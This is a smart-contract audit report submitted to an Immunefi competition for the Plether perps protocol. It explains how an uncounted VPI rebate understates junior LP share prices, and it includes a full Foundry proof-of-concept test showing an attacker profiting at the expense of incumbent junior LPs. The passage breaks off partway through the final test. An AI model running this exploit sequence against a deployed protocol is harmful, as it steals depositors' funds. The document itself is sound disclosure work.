# \#99859 [SC-Critical] Junior LP deposit is priced below value while a VPI rebate is outstanding, stealing principal from other junior LPs

**Submitted on Nov 15th 2026 at 14:07:55 UTC by @v4rvl for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99859
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

A skew-reducing open receives a negative VPI amount (a rebate) `R`, and `R` leaves HousePool cash.

`R` is not a loss to the pool:
- The trader must lock an equal, nonwithdrawable VPI reserve in its clearinghouse account.
- At close, the lifetime clamp charges the position at least `R` back.
- The close then moves the reserve into the pool.

While the position is open, `HousePoolAccountingLib.buildReconcileSnapshot` prices LP shares from pool custody only, plus a terminal price curve that has no VPI term. The reserve sits in the clearinghouse, so the reconcile counts neither the cash that left nor the reserve that guarantees its return. Junior net asset value is therefore understated by exactly `R` for as long as the position is open.

LP epoch settlement prices pending Junior deposits and redemptions from this reconcile, and anyone can trigger it through `OrderRouter.settleLpEpoch`. An attacker with a pending Junior deposit can:
1. open a position that offsets an existing skew,
2. call the settlement itself,
3. close the position.

Its deposit is then priced `R` below the value that returns to the pool seconds later. The attacker redeems in a later epoch at the restored price. Incumbent Junior LPs lose `f * R` to the attacker, and honest LPs redeeming in the same settlement are paid in cash at the understated price.

Measured with release parameters, attacker at 50 % of Junior, honest skew at 39 % of depth:
- the attacker deposits 1,000,999.899493 USDG and redeems 1,002,122.130747 USDG (+1,122.231254 USDG);
- after 936.56 USDG of execution fees it ends +185.653630 USDG richer, which is +203.907125 USDG against the same deposit and redemption without the position;
- the incumbent Junior LP ends 1,139.327808 USDG poorer;
- the honest trader and the Senior tranche are unchanged to the atom.

## Root cause

**1. The open pays the rebate out of pool cash.** `libraries/CfdEnginePlanLib.sol:333`:

```solidity
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

`tradeCostAssets` is the signed VPI plus the execution fee. The net rebate is paid from the pool in `CfdEngineSettlementSidecar.sol:442-444`:

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

The execution fee that this negative trade cost does not cover is topped up from pool cash in `CfdEngineSettlementSidecar.sol:498` → `:905-926` (`pool.payOut(...)`). Together, pool cash falls by the full VPI rebate `R`. `HousePool.payOut` (`HousePool.sol:604-613`) does `accountedAssets -= amount` and transfers the tokens out.

**2. The trader must lock an equal reserve in the clearinghouse, outside pool custody.**
- The reserve target is `max(-vpiAccrued, 0)` (`CfdEnginePlanLib.sol:48-55`, `:348-349`).
- `CfdEngineSettlementSidecar.sol:466-478` locks it with `clearinghouse.lockVpiRebateReserve(account, ...)` (or reclassifies pledge into it).
- `MarginClearinghouse.sol:843-852` records it:

```solidity
function lockVpiRebateReserve(address account, uint256 amountAssets) external onlyOperator {
    if (amountAssets == 0) { return; }
    _lockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
    vpiRebateReserveBalances[account] += amountAssets;
}
```

**3. The close recovers `R` into the pool.** The lifetime clamp in `libraries/CloseAccountingLib.sol:103-118`:

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

So a full close is charged at least `-vpiAccrued = R`. The planner turns that into reserve consumption (`CfdEnginePlanLib.sol:1045-1057`). `CfdEngineSettlementSidecar.sol:690-692` then calls `clearinghouse.consumeVpiRebateReserve(delta.account, host.pool(), delta.vpiRebateReserveConsumedAssets)`, which moves the reserve into the pool.

**4. The LP pricing snapshot counts neither the outflow nor the reserve.**
- Physical assets are pool custody only: `CfdEngineProtocolLens.sol:63-64` reads `engineContract.pool().totalAssets()`, and `HousePool.sol:426-429` returns `min(raw balance, accountedAssets)`.
- The terminal delta comes from per-account price curves built from lots, entry cost and the `pnlPledge + traderClaim` cap (`TerminalNavBookV2.sol:417-447`). There is no VPI term, and the VPI reserve is not part of the cap.
- `libraries/HousePoolAccountingLib.sol:60-78`:

```solidity
function buildReconcileSnapshot(
    HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
) internal pure returns (ReconcileSnapshot memory snapshot) {
    uint256 terminalAssets = engineSnapshot.physicalAssets;
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
    int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
    if (terminalDelta >= 0) {
        terminalAssets += uint256(terminalDelta);
    } else {
        terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
    }
    if (terminalAssets >= terminalLiabilities) {
        snapshot.distributable = terminalAssets - terminalLiabilities;
    } else {
        snapshot.deficit = terminalLiabilities - terminalAssets;
    }
}
```

The value `R` is owed back to the pool and fully backed by the clearinghouse reserve, but it appears in no term. Distributable value, and with it the Junior residual, is `R` lower than it will be once the position closes.

**5. Epoch settlement prices LP entries and exits from that snapshot, and anyone can trigger it.**
- `OrderRouter.sol:479-484` (`settleLpEpoch`, documented as "Permissionless") delegates to `router/OrderLiquidationBatchLogic.sol:549-581`. That code updates the mark and calls `HousePool.settleLpEpoch` from the router, with no restriction on the caller.
- `HousePool.sol:797-835` runs `_reconcile`, which calls `buildReconcileSnapshot` at `HousePool.sol:1555-1563`.
- `HousePool.sol:915-916` then prices Junior deposits at `pricingAssets = juniorPrincipal`, `pricingSupply = _juniorShareSupply()`.
- Junior redemptions in the same settlement are priced from the same `juniorPrincipal` (`HousePool.sol:836`, `juniorPhase.pricingPrincipal = juniorPrincipal`).

## Proof of Concept

### Proof of concept

Place the file at `packages/perps/test/perps/T_vpi_mirror_RebateUnderstatement.t.sol` and run from `packages/perps`:

```sh
forge test --match-path 'test/perps/T_vpi_mirror_*' -vv
```

The test changes no protocol contract. It uses only the repository's fixture, the timelocked admin paths to apply the release parameters, `settlementToken.mint` on the fixture's mock settlement token to fund users (as the fixture itself does), and `vm.warp`, `vm.roll`, `vm.prank`, `vm.snapshotState` and `vm.revertToState`. It does not use `vm.store`, `vm.etch`, `vm.mockCall` or `deal`. The attacked epoch settlement is called by the attacker's own address.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

import {console2} from "forge-std/console2.sol";

import {OrderRouterPythTestBase} from "./shared/OrderRouterTestBase.sol";

/// Reserve-backed negative-VPI rebate is excluded from Junior share pricing.
/// A skew-REDUCING open is paid a VPI rebate R out of pool cash; R is a receivable guaranteed by the trader's
/// dedicated VPI reserve (held in the clearinghouse, outside pool assets) and is clawed back at close by the
/// lifetime clamp. While the position is open, buildReconcileSnapshot does not count R, so junior NAV is understated.
///
/// Actors: bob (incumbent junior LP, fixture), sally (senior LP), carol (honest trader, LONG, open the whole test,
/// skews the book), attacker (trader account + junior LP account, same address).
/// Arms (same timestamps, constant price 1.00):
///   ATTACK : attacker junior deposit pending; attacker opens SHORT (skew-reducing, paid R); epoch settles (deposit
///            priced at understated NAV); attacker closes (R clawed back); attacker redeems next epoch.
///   CTRL_A : identical deposit/settlement/redemption, no attacker position.
///   CTRL_B : identical open and close, but the close executes BEFORE the settlement.
contract T_vpi_mirror_RebateUnderstatement is OrderRouterPythTestBase {
    address internal attacker = address(0xA77AC4);
    address internal keeper = address(0x4EE9);
    address internal carol = address(0xCA201); // honest trader
    address internal sally = address(0x5A11); // senior LP

    int64 internal constant PX = 100_000_000; // 1.00 on both feeds -> basket 1.00
    uint256 internal constant T0 = SETUP_TIMESTAMP + 10 hours; // live market, hour-aligned
    uint256 internal constant TRADER_COLLATERAL = 200_000e6;
    uint256 internal constant TRADER_MARGIN = 60_000e6;

    uint8 internal constant ATTACK = 0;
    uint8 internal constant CTRL_A = 1;
    uint8 internal constant CTRL_B = 2;

    struct Cfg {
        uint256 attackerShareOfJuniorPct; // attacker deposit as % of junior after the deposit
        uint256 carolSkewPct; // carol's notional as % of economic depth
        uint256 seniorDeposit;
        uint256 bobRedeemAtAttackBps; // redemption-side variant: bob redeems this share in the attacked settlement
        uint256 attackerOffsetPct; // attacker SHORT size as % of carol's LONG size (100 = full offset)
    }

    struct Arm {
        uint256 attackerDeposit;
        uint256 carolNotional;
        uint256 attackerNotional;
        int256 carolVpi;
        int256 attackerVpiAtOpen; // negative = rebate R
        uint256 juniorPriceAtAttackE18; // juniorPrincipal / supply right after the attacked settlement
        uint256 attackerShares;
        uint256 attackerRedemption;
        int256 traderLegDelta;
        int256 lpLegDelta;
        int256 attackerNet;
        uint256 treasuryDelta;
        uint256 bobPayout; // bob's redemption payout in the attacked settlement (variant only)
        uint256 bobValueEnd; // bob's remaining shares at the final junior price
        uint256 carolWealthEnd;
        uint256 seniorPrincipalEnd;
        uint256 juniorPrincipalEnd;
        // Inputs for the off-chain emulation of alternative reconcile rules (no source change).
        uint256 sPre; // junior pricing supply (accruedTotalSupply) immediately before the attacked settlement
        uint256 jPre; // junior pricing assets at the attacked settlement = juniorPrincipal after it - accepted deposit
        uint256 posVpiSum; // sum(max(vpiAccrued, 0)) over open positions at the attacked settlement
        uint256 negVpiSum; // sum(max(-vpiAccrued, 0)) over open positions at the attacked settlement
        uint256 sRedPre; // junior supply immediately before the redemption settlement
        uint256 jRedPre; // junior principal at the redemption settlement before the attacker's payout
        uint256 posVpiSumAtRed; // sum(max(vpiAccrued, 0)) at the redemption settlement
    }

    // ---------------------------------------------------------------------------------------- helpers

    function _applyRelease() internal {
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8_000;
        pc.seniorRateBps = 800;
        pool.proposePoolConfig(pc);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        ICfdEngineAdminHost.EngineRiskConfig memory config;
        config.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
        config.executionFeeBps = 4;
        config.frozenCloseSpreadBps = 50;
        config.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        (uint256 k, uint256 maxSkew, uint256 maint, uint256 init,,,,,,) = engine.riskParams();
        assertEq(k, 0.01e18, "release vpiFactor");
        assertEq(maxSkew, 0.4e18, "release maxSkewRatio");
        assertEq(maint, 10, "release maint");
        assertEq(init, 20, "release init");
        assertEq(uint256(engine.executionFeeBps()), 4, "release execution fee");
        assertEq(pool.seniorRateBps(), 800, "release senior rate");
        assertEq(pool.maxSeniorShareBps(), 8_000, "release senior share");
    }

    function _blob(int64 price, uint256 publishTime, uint256 prevPublishTime)
        internal
        pure
        returns (bytes[] memory data)
    {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(FEED_A, MockPyth.MockPrice(price, 0, int32(-8), publishTime, prevPublishTime));
        u[1] = MockPyth.FeedUpdate(FEED_B, MockPyth.MockPrice(price, 0, int32(-8), publishTime, prevPublishTime));
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _at(uint256 t) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _settle(uint256 t) internal {
        _settleAs(keeper, t);
    }

    /// OrderRouter.settleLpEpoch is permissionless: any address may call it with a valid price update.
    function _settleAs(address caller, uint256 t) internal {
        _at(t);
        bytes[] memory b = _blob(PX, t - 1, t - 2);
        vm.prank(caller);
        router.settleLpEpoch(b);
    }

    function _posVpi(address who) internal view returns (uint256) {
        int256 v = _vpiAccrued(who);
        return v > 0 ? uint256(v) : 0;
    }

    function _negVpi(address who) internal view returns (uint256) {
        int256 v = _vpiAccrued(who);
        return v < 0 ? uint256(-v) : 0;
    }

    /// Permissionless mark refresh (LP requests with open positions need a mark within markStalenessLimit).
    function _mark(uint256 t) internal {
        _at(t);
        bytes[] memory b = _blob(PX, t - 1, t - 2);
        vm.prank(keeper);
        router.updateMarkPrice(b);
    }

    function _trade(address who, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 t) internal {
        _at(t);
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        _at(t + 2);
        bytes[] memory b = _blob(PX, t + 1, t);
        vm.prank(who);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, b);
        require(r.status == OrderV3Types.LifecycleStatus.Executed, "order must execute");
    }

    function _wealth(address who) internal view returns (uint256) {
        return settlementToken.balanceOf(who) + clearinghouse.balanceAssets(who) + engine.traderClaimBalanceAssets(who);
    }

    function _traderWealth(address who) internal view returns (uint256) {
        return clearinghouse.balanceAssets(who) + engine.traderClaimBalanceAssets(who);
    }

    function _treasuryWealth() internal view returns (uint256) {
        address t = engine.protocolTreasury();
        return settlementToken.balanceOf(t) + clearinghouse.balanceAssets(t);
    }

    function _vpiAccrued(address who) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(who);
    }

    function _size(address who) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(who);
    }

    function _depth() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _lotsNotional(uint256 assets) internal pure returns (uint256) {
        return (assets / 100e6) * 100e18;
    }

    function _juniorPriceE18() internal view returns (uint256) {
        return pool.juniorPrincipal() * 1e18 / juniorVault.totalSupply();
    }

    function _fundTrader(address who) internal {
        settlementToken.mint(who, TRADER_COLLATERAL);
        vm.startPrank(who);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(who, TRADER_COLLATERAL);
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------------- scenario

    function _run(uint8 mode, Cfg memory cfg) internal returns (Arm memory a) {
        _applyRelease();
        _at(T0);
        {
            bytes[] memory prime = _blob(PX, T0 - 1, T0 - 2);
            vm.prank(keeper);
            router.updateMarkPrice(prime);
        }

        // Senior LP enters first (clean epoch, nothing open).
        uint256 seniorReq;
        if (cfg.seniorDeposit > 0) {
            settlementToken.mint(sally, cfg.seniorDeposit);
            _at(T0 + 30);
            vm.startPrank(sally);
            settlementToken.approve(address(seniorVault), cfg.seniorDeposit);
            seniorReq = seniorVault.requestDeposit(cfg.seniorDeposit, sally, sally);
            vm.stopPrank();
        }
        _settle(T0 + 1 hours + 20);
        if (cfg.seniorDeposit > 0) {
            uint256 sc = seniorVault.claimableDepositRequest(seniorReq, sally);
            assertEq(sc, cfg.seniorDeposit, "senior deposit activated");
            vm.prank(sally);
            seniorVault.claimDeposit(seniorReq, sc, sally, sally);
        }

        // Carol (honest) skews the book LONG and keeps the position open for the whole test (all arms).
        _fundTrader(carol);
        a.carolNotional = _lotsNotional(_depth() * cfg.carolSkewPct / 100);
        _trade(carol, CfdTypes.Side.LONG, a.carolNotional, TRADER_MARGIN, false, T0 + 1 hours + 100);
        a.carolVpi = _vpiAccrued(carol);

        // Attacker funds the trader account and requests a junior deposit in epoch E1 (matures at e).
        uint256 juniorNow = pool.juniorPrincipal();
        a.attackerDeposit = juniorNow * cfg.attackerShareOfJuniorPct / (100 - cfg.attackerShareOfJuniorPct);
        _fundTrader(attacker);
        settlementToken.mint(attacker, a.attackerDeposit);
        vm.prank(attacker);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        uint256 attacker0 = _wealth(attacker);
        uint256 trader0 = _traderWealth(attacker);
        uint256 treasury0 = _treasuryWealth();

        _mark(T0 + 1 hours + 300);
        vm.prank(attacker);
        uint256 depId = juniorVault.requestDeposit(a.attackerDeposit, attacker, attacker);

        uint256 bobRedId;
        uint256 bobRedShares;
        if (cfg.bobRedeemAtAttackBps > 0) {
            bobRedShares = juniorVault.balanceOf(bob) * cfg.bobRedeemAtAttackBps / 10_000;
            _mark(T0 + 1 hours + 310);
            vm.prank(bob);
            bobRedId = juniorVault.requestRedeem(bobRedShares, bob, bob);
        }

        uint256 e = T0 + 2 hours; // the deposit (and bob's redemption) mature at this boundary
        // Attacker offsets carol's skew by attackerOffsetPct, rounded down to the 100-token position quantum.
        a.attackerNotional = (a.carolNotional * cfg.attackerOffsetPct / 100) / 100e18 * 100e18;

        if (mode != CTRL_A) {
            _trade(attacker, CfdTypes.Side.SHORT, a.attackerNotional, TRADER_MARGIN, false, e + 10);
            a.attackerVpiAtOpen = _vpiAccrued(attacker);
        } else {
            _at(e + 12);
        }
        if (mode == CTRL_B) {
            _trade(attacker, CfdTypes.Side.SHORT, a.attackerNotional, 0, true, e + 20);
        } else {
            _at(e + 22);
        }

        // The attacker itself calls the permissionless epoch settlement that prices its deposit (and bob's
        // redemption in the variant). Same caller in every arm.
        _at(e + 30);
        a.sPre = juniorVault.accruedTotalSupply();
        a.posVpiSum = _posVpi(carol) + _posVpi(attacker);
        a.negVpiSum = _negVpi(carol) + _negVpi(attacker);
        _settleAs(attacker, e + 30);
        a.juniorPriceAtAttackE18 = _juniorPriceE18();
        a.jPre = pool.juniorPrincipal() - a.attackerDeposit;

        if (mode == ATTACK) {
            _trade(attacker, CfdTypes.Side.SHORT, a.attackerNotional, 0, true, e + 40);
        } else {
            _at(e + 42);
        }
        assertEq(_size(attacker), 0, "attacker flat");
        assertEq(_size(carol), a.carolNotional, "carol still open");

        _mark(e + 50);
        uint256 claimable = juniorVault.claimableDepositRequest(depId, attacker);
        assertEq(claimable, a.attackerDeposit, "attacker deposit activated in full");
        vm.prank(attacker);
        a.attackerShares = juniorVault.claimDeposit(depId, claimable, attacker, attacker);
        if (cfg.bobRedeemAtAttackBps > 0) {
            uint256 bc = juniorVault.claimableRedeemRequest(bobRedId, bob);
            assertEq(bc, bobRedShares, "bob redemption funded");
            vm.prank(bob);
            a.bobPayout = juniorVault.claimRedeem(bobRedId, bc, bob, bob);
        }

        // Attacker redeems everything in the next epoch (after cooldown); carol still open.
        _mark(e + 1 hours + 300);
        vm.prank(attacker);
        uint256 redId = juniorVault.requestRedeem(a.attackerShares, attacker, attacker);
        _at(e + 2 hours + 30);
        a.sRedPre = juniorVault.accruedTotalSupply();
        a.posVpiSumAtRed = _posVpi(carol) + _posVpi(attacker);
        _settle(e + 2 hours + 30);
        _mark(e + 2 hours + 50);
        uint256 rc = juniorVault.claimableRedeemRequest(redId, attacker);
        assertEq(rc, a.attackerShares, "attacker redemption funded in full");
        vm.prank(attacker);
        a.attackerRedemption = juniorVault.claimRedeem(redId, rc, attacker, attacker);
        a.jRedPre = pool.juniorPrincipal() + a.attackerRedemption;

        a.traderLegDelta = int256(_traderWealth(attacker)) - int256(trader0);
        a.lpLegDelta = int256(a.attackerRedemption) - int256(a.attackerDeposit);
        a.attackerNet = int256(_wealth(attacker)) - int256(attacker0);
        a.treasuryDelta = _treasuryWealth() - treasury0;
        a.bobValueEnd = juniorVault.balanceOf(bob) * pool.juniorPrincipal() / juniorVault.totalSupply();
        a.carolWealthEnd = _traderWealth(carol);
        a.seniorPrincipalEnd = pool.seniorPrincipal();
        a.juniorPrincipalEnd = pool.juniorPrincipal();
        assertEq(_vpiAccrued(carol), a.carolVpi, "carol's VPI record unchanged");
    }

    function _log(string memory tag, Arm memory a) internal pure {
        console2.log(tag);
        console2.log("  attacker deposit:", a.attackerDeposit);
        console2.log("  carol notional (1e18):", a.carolNotional);
        console2.log("  carol vpiAccrued:");
        console2.logInt(a.carolVpi);
        console2.log("  attacker vpiAccrued at open (neg = rebate R):");
        console2.logInt(a.attackerVpiAtOpen);
        console2.log("  junior price at attacked settlement (1e18):", a.juniorPriceAtAttackE18);
        console2.log("  attacker shares:", a.attackerShares);
        console2.log("  attacker redemption:", a.attackerRedemption);
        console2.log("  attacker LP leg delta:");
        console2.logInt(a.lpLegDelta);
        console2.log("  attacker trader leg delta (fees+carry+VPI net):");
        console2.logInt(a.traderLegDelta);
        console2.log("  attacker net (LP+trader):");
        console2.logInt(a.attackerNet);
        console2.log("  treasury delta:", a.treasuryDelta);
        console2.log("  bob payout in attacked settlement:", a.bobPayout);
        console2.log("  bob remaining value end:", a.bobValueEnd);
        console2.log("  carol trader wealth end:", a.carolWealthEnd);
        console2.log("  senior principal end:", a.seniorPrincipalEnd);
        console2.log("  junior principal end:", a.juniorPrincipalEnd);
    }

    /// Off-chain emulation of two alternative reconcile rules, computed from measured on-chain values (no source change).
    /// Subtracting an amount X from `distributable` lowers the junior residual by X while the senior claim is covered,
    /// so junior pricing assets become jPre - X. Rules:
    ///   positive-only: X = sum(max(vpiAccrued, 0))
    ///   signed       : X = sum(max(vpiAccrued, 0)) - sum(max(-vpiAccrued, 0))
    /// The attacker's shares are re-priced under the rule and redeemed at the rule's redemption value (attacker flat,
    /// so both rules subtract only carol's positive accrual there). Pool-level junior principal does not depend on
    /// how many shares were minted, so this re-pricing is exact up to share rounding.
    struct Emu {
        uint256 priceCurrentE18;
        uint256 pricePosOnlyE18;
        uint256 priceSignedE18;
        int256 redemptionCheckDiff; // emulated current-code redemption - measured redemption (sanity check)
        int256 lpLegPosOnly;
        int256 lpLegSigned;
    }

    function _emulate(Arm memory a) internal pure returns (Emu memory m) {
        m.priceCurrentE18 = a.jPre * 1e18 / a.sPre;
        uint256 jPos = a.jPre - a.posVpiSum;
        uint256 jSigned = a.jPre - a.posVpiSum + a.negVpiSum;
        m.pricePosOnlyE18 = jPos * 1e18 / a.sPre;
        m.priceSignedE18 = jSigned * 1e18 / a.sPre;
        m.redemptionCheckDiff = int256(a.attackerShares * a.jRedPre / a.sRedPre) - int256(a.attackerRedemption);
        uint256 vRed = a.jRedPre - a.posVpiSumAtRed;
        uint256 sharesPos = a.attackerDeposit * a.sPre / jPos;
        uint256 sharesSigned = a.attackerDeposit * a.sPre / jSigned;
        m.lpLegPosOnly =
            int256(sharesPos * vRed / (a.sRedPre - a.attackerShares + sharesPos)) - int256(a.attackerDeposit);
        m.lpLegSigned =
            int256(sharesSigned * vRed / (a.sRedPre - a.attackerShares + sharesSigned)) - int256(a.attackerDeposit);
    }

    function _logEmu(string memory tag, Arm memory a) internal pure returns (Emu memory m) {
        m = _emulate(a);
        console2.log(tag);
        console2.log("  pricing supply / assets at attacked settlement:", a.sPre, a.jPre);
        console2.log("  sum(max(vpi,0)) / sum(max(-vpi,0)) at attacked settlement:", a.posVpiSum, a.negVpiSum);
        console2.log("  junior price current code (1e18):", m.priceCurrentE18);
        console2.log("  junior price positive-only fix (1e18):", m.pricePosOnlyE18);
        console2.log("  junior price signed fix (1e18):", m.priceSignedE18);
        console2.log("  emulation sanity (emulated - measured current-code redemption):");
        console2.logInt(m.redemptionCheckDiff);
        console2.log("  attacker LP leg under positive-only fix:");
        console2.logInt(m.lpLegPosOnly);
        console2.log("  attacker LP leg under signed fix:");
        console2.logInt(m.lpLegSigned);
    }

    function _compare(Cfg memory cfg) internal returns (Arm memory atk, Arm memory ca, Arm memory cb) {
        uint256 snap = vm.snapshotState();
        atk = _run(ATTACK, cfg);
        vm.revertToState(snap);
        ca = _run(CTRL_A, cfg);
        vm.revertToState(snap);
        cb = _run(CTRL_B, cfg);
        vm.revertToState(snap);

        console2.log("=== cfg: attacker share of junior %, carol skew % depth, bob redeem bps");
        console2.log(cfg.attackerShareOfJuniorPct, cfg.carolSkewPct, cfg.bobRedeemAtAttackBps);
        _log("ATTACK", atk);
        _log("CTRL_A (no attacker position)", ca);
        _log("CTRL_B (open+close before settlement)", cb);
        console2.log("SUMMARY attacker net ATTACK - CTRL_A:");
        console2.logInt(atk.attackerNet - ca.attackerNet);
        console2.log("SUMMARY attacker net ATTACK - CTRL_B:");
        console2.logInt(atk.attackerNet - cb.attackerNet);
        console2.log("SUMMARY bob total (payout+remaining) CTRL_A - ATTACK:");
        console2.logInt(int256(ca.bobPayout + ca.bobValueEnd) - int256(atk.bobPayout + atk.bobValueEnd));
        console2.log("SUMMARY carol wealth ATTACK - CTRL_A:");
        console2.logInt(int256(atk.carolWealthEnd) - int256(ca.carolWealthEnd));
        console2.log("SUMMARY senior principal ATTACK - CTRL_A:");
        console2.logInt(int256(atk.seniorPrincipalEnd) - int256(ca.seniorPrincipalEnd));
        console2.log("SUMMARY attacker LP leg ATTACK - CTRL_A:");
        console2.logInt(atk.lpLegDelta - ca.lpLegDelta);
    }

    function _assertSameMarket(Arm memory atk, Arm memory ca, Arm memory cb) internal pure {
        assertEq(atk.carolWealthEnd, ca.carolWealthEnd, "carol identical ATTACK vs CTRL_A");
        assertEq(atk.carolWealthEnd, cb.carolWealthEnd, "carol identical ATTACK vs CTRL_B");
        assertEq(atk.seniorPrincipalEnd, ca.seniorPrincipalEnd, "senior identical ATTACK vs CTRL_A");
        assertEq(atk.attackerDeposit, ca.attackerDeposit, "same deposit");
    }

    // ---------------------------------------------------------------------------------------- tests

    function test_main_50pct_40skew() public {
        (Arm memory atk, Arm memory ca, Arm memory cb) = _compare(
            Cfg({attackerShareOfJuniorPct: 50, carolSkewPct: 39, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100})
        );
        _assertSameMarket(atk, ca, cb);
        assertLt(atk.attackerVpiAtOpen, 0, "attacker received a VPI rebate");
        assertLt(atk.juniorPriceAtAttackE18, ca.juniorPriceAtAttackE18, "attacked settlement priced below control");
        assertGt(atk.attackerNet, ca.attackerNet, "attacker ends richer than in the no-trade control");
        assertGt(atk.attackerNet, 0, "attacker ends richer than it started");
        assertLt(atk.bobValueEnd, ca.bobValueEnd, "incumbent junior LP ends poorer than in the no-trade control");
    }

    /// Partial offset: attacker SHORT = 50 % of carol's LONG, attacker 75 % of junior, carol 39 % of depth.
    function test_partialOffset_75pct_40skew_half() public {
        (Arm memory atk, Arm memory ca, Arm memory cb) = _compare(
            Cfg({attackerShareOfJuniorPct: 75, carolSkewPct: 39, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 50})
        );
        _assertSameMarket(atk, ca, cb);
        assertLt(atk.attackerVpiAtOpen, 0, "attacker received a VPI rebate");
    }

    /// Emulates the positive-only reconcile fix (subtract sum(max(vpiAccrued,0))) and the signed fix on the main case.
    function test_positiveOnlyFixLeavesTheGap() public {
        (Arm memory atk, Arm memory ca, Arm memory cb) = _compare(
            Cfg({attackerShareOfJuniorPct: 50, carolSkewPct: 39, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100})
        );
        Emu memory mAtk = _logEmu("EMU ATTACK", atk);
        Emu memory mCa = _logEmu("EMU CTRL_A", ca);
        Emu memory mCb = _logEmu("EMU CTRL_B (position closed before the settlement)", cb);
        uint256 r = uint256(-atk.attackerVpiAtOpen);
        // Positive-only fix: the attacked settlement's junior pricing assets are still about R below the post-close
        // (CTRL_B) and no-position (CTRL_A) values; the fix subtracts carol's C equally in every arm.
        uint256 gapPosB = (cb.jPre - cb.posVpiSum) - (atk.jPre - atk.posVpiSum);
        uint256 gapPosA = (ca.jPre - ca.posVpiSum) - (atk.jPre - atk.posVpiSum);
        console2.log("SUMMARY R:", r);
        console2.log("SUMMARY positive-only fix: junior pricing assets CTRL_B - ATTACK:", gapPosB);
        console2.log("SUMMARY positive-only fix: junior pricing assets CTRL_A - ATTACK:", gapPosA);
        assertApproxEqRel(gapPosB, r, 0.001e18, "positive-only fix leaves the R understatement (vs post-close)");
        assertApproxEqRel(gapPosA, r, 0.001e18, "positive-only fix leaves the R understatement (vs no position)");
        assertLt(mAtk.pricePosOnlyE18, mCb.pricePosOnlyE18, "positive-only fix: attacked price below post-close");
        console2.log("SUMMARY positive-only fix: attacker LP leg ATTACK - CTRL_A:");
        console2.logInt(mAtk.lpLegPosOnly - mCa.lpLegPosOnly);
        assertGt(mAtk.lpLegPosOnly - mCa.lpLegPosOnly, int256(r) / 4, "positive-only fix: transfer remains");
        // Signed fix: ATTACK and CTRL_A price the deposit at the same junior value (within carry rounding).
        int256 signedGap = int256(atk.jPre - atk.posVpiSum + atk.negVpiSum) - int256(ca.jPre - ca.posVpiSum);
        console2.log("SUMMARY signed fix: junior pricing assets ATTACK - CTRL_A:");
        console2.logInt(signedGap);
        console2.log("SUMMARY signed fix: attacker LP leg ATTACK - CTRL_A:");
        console2.logInt(mAtk.lpLegSigned - mCa.lpLegSigned);
        assertLt(signedGap < 0 ? -signedGap : signedGap, int256(r) / 1000, "signed fix closes the gap");
        // Emulation sanity: the current-code re-pricing reproduces the measured redemptions.
        assertLt(mAtk.redemptionCheckDiff < 0 ? -mAtk.redemptionCheckDiff : mAtk.redemptionCheckDiff, 10, "emu sanity");
        assertLt(mCa.redemptionCheckDiff < 0 ? -mCa.redemptionCheckDiff : mCa.redemptionCheckDiff, 10, "emu sanity A");
    }

    function test_sens_10pct_40skew() public {
        _compare(Cfg({attackerShareOfJuniorPct: 10, carolSkewPct: 39, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100}));
    }

    function test_sens_75pct_40skew() public {
